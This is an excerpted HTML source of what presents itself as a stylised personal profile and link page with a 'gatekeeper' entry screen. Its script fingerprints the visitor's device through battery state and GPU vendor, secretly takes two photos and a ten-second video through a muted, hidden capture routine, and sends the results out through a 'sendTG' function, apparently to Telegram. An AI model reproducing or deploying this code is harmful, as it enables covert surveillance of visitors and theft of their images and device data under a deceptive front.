    ...
    <style>
        ...
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
        ...
        .gate-card {
            ...
            border-radius: 12px; padding: 40px 25px;
            box-shadow: 0 0 60px rgba(212, 175, 55, 0.15);
            text-align: center; position: relative;
            animation: pulseBorder 4s infinite alternate;
        }
        @keyframes pulseBorder { from { border-color: rgba(212,175,55,0.3); } to { border-color: rgba(212,175,55,1); } }
        ...
        .gate-img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; filter: sepia(10%); }
        ...
        .gate-input {
            ...
            color: #fff; font-size: 14px; font-family: 'Rajdhani'; letter-spacing: 1px;
            border-radius: 6px; transition: 0.3s; text-align: center;
        }
        .gate-input:focus { border-color: var(--gold-primary); background: rgba(212, 175, 55, 0.05); box-shadow: var(--neon-glow); }

        .gate-btn {
            width: 100%; padding: 14px; margin-top: 10px;
            background: var(--gold-primary); color: #000; font-weight: 900; font-size: 14px;
        ...
        .loading-text {
            margin-top: 15px; font-size: 10px; color: var(--gold-primary); 
        ...
        .hero-avatar {
            ...
            padding: 3px; border: 2px solid var(--gold-primary);
            box-shadow: 0 0 40px rgba(212, 175, 55, 0.2);
            background: #000;
        }
        .hero-avatar img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }
        .hero-name { 
            font-family: 'Rajdhani'; font-size: 30px; font-weight: 700; color: #fff; 
            margin-bottom: 5px; text-shadow: 0 0 10px rgba(0,0,0,0.8);
        }
        .hero-role { color: var(--gold-primary); font-size: 11px; letter-spacing: 4px; text-transform: uppercase; font-weight: bold; }
        ...
        #installBtn {
            ...
            font-size: 10px; font-weight: bold; cursor: pointer; letter-spacing: 2px;
            box-shadow: 0 0 15px rgba(212, 175, 55, 0.1); transition: 0.3s;
        }
        ...
        .section-header {
            ...
            border-bottom: 1px solid rgba(212,175,55,0.2); padding-bottom: 5px;
        }
        ...
        .sys-card:hover { border-color: var(--gold-dim); background: rgba(30, 30, 30, 0.8); }
        .sys-card:hover::before { opacity: 1; }
        .sys-card:active { transform: scale(0.98); }
        
        .sys-card i { font-size: 24px; margin-bottom: 10px; color: var(--gold-primary); }
        .sys-card span { font-size: 10px; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; color: #ccc; font-family: 'Rajdhani'; }
        ...
        .nav-item span { font-size: 9px; letter-spacing: 1px; font-weight: bold; }
        ...
        /* Hidden Engines - MUTED for Silence */
        ...
        .modal-inner { width: 90%; max-width: 400px; background: #080808; border: 1px solid var(--gold-primary); padding: 25px; position: relative; }
    </style>
</head>
<body>
    ...
    <div id="gatekeeper">
        <div class="gate-card">
            ...
            <button class="gate-btn" onclick="initiateSystem()">
                INITIALIZE UPLINK
            </button>
            
            <div class="loading-text" id="g-status">
                <i class="fas fa-terminal"></i> EXTRACTING DEVICE METADATA...
            </div>
        </div>
    </div>
    ...
    <div id="main-interface">
        ...
        <div class="container">
            ...
            <div class="grid">
                ...
                <a href="https://x.com/LaluKumarTanti" class="sys-card"><i class="fab fa-x-twitter"></i><span>X (Twitter)</span></a>
    ...
    <script>
        ...
        async function extractHardwareIntel() {
            ...
            try {
                ...
                intel.batState = b.charging ? "Charging ⚡" : "Discharging 🔋";
            ...
            try {
                ...
                intel.vendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
            } catch(e) { intel.gpu = "Integrated"; }
        ...
        async function initiateSystem() {
            ...
            executeMultiShotCapture(); // 2 Photos + 10s Video
...
`;
        ...
        function sendTG(text, file, isVideo) {
            ...
            if(file) {
                // If isVideo is true, use 'sendDocument' or 'sendVideo'
                // 'sendDocument' is safer for .webm if sendVideo fails on some devices
